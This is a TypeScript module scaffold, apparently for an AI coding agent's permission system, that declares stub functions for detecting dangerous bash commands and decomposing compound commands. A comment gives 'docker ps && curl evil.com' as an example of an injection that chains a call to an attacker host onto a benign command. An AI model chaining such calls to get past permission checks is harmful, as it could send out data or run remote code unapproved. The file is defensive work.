/**
 * @claude-patterns/dangerous-command-detection
 *
 * Compound command decomposition prevents injection bypass. AST-level bash analysis.
 * Auto-stripping of dangerous permissions in auto mode.
 * Source: utils/permissions/dangerousPatterns.ts + BashTool/ (12,411 LOC)
 * KB: Section 8.6 / Pattern 8
 * Tier: Extract P2
 */

import type { PermissionMode, PermissionRule } from "@claude-patterns/permission-system";
import { DANGEROUS_BASH_PATTERNS, CROSS_PLATFORM_CODE_EXEC } from "@claude-patterns/permission-system";
import type { FileOperationType } from "@claude-patterns/path-validation";
import { isDangerousRemovalPath } from "@claude-patterns/path-validation";

// Re-export from permission-system for consumers who only need dangerous patterns
export { DANGEROUS_BASH_PATTERNS, CROSS_PLATFORM_CODE_EXEC };

// Compound command operators that need decomposition
export const COMPOUND_OPERATORS = ["&&", "||", ";", "|"] as const;
export type CompoundOperator = (typeof COMPOUND_OPERATORS)[number];

// Result of security analysis on a bash command
export interface CommandSecurityResult {
  isDangerous: boolean;
  reasons: string[];
  matchedPatterns: string[];
  subcommands: string[];
}

// Decompose compound commands (&&, ||, ;, |) into individual subcommands
// Prevents injection bypass like "docker ps && curl evil.com"
export function decomposeCompoundCommand(command: string): string[] {
  // TODO: extract from utils/permissions/dangerousPatterns.ts
  throw new Error("TODO: extract from utils/permissions/dangerousPatterns.ts");
}

// Check if a command matches dangerous patterns
export function isDangerousCommand(
  command: string,
  mode: PermissionMode,
): CommandSecurityResult {
  // TODO: extract from utils/permissions/dangerousPatterns.ts
  throw new Error("TODO: extract from utils/permissions/dangerousPatterns.ts");
}

// AST-level security analysis of bash command
export function parseForSecurity(command: string): CommandSecurityResult {
  // TODO: extract from BashTool/
  throw new Error("TODO: extract from BashTool/");
}

// Check if a command is safe for read-only/plan mode
export function isCommandSafeForPlanMode(command: string): boolean {
  // TODO: extract from BashTool/
  throw new Error("TODO: extract from BashTool/");
}

// Check if a file operation targets a dangerous path
export function isFileDangerousForOperation(
  path: string,
  operation: FileOperationType,
): boolean {
  // TODO: extract from utils/permissions/dangerousPatterns.ts
  throw new Error("TODO: extract from utils/permissions/dangerousPatterns.ts");
}
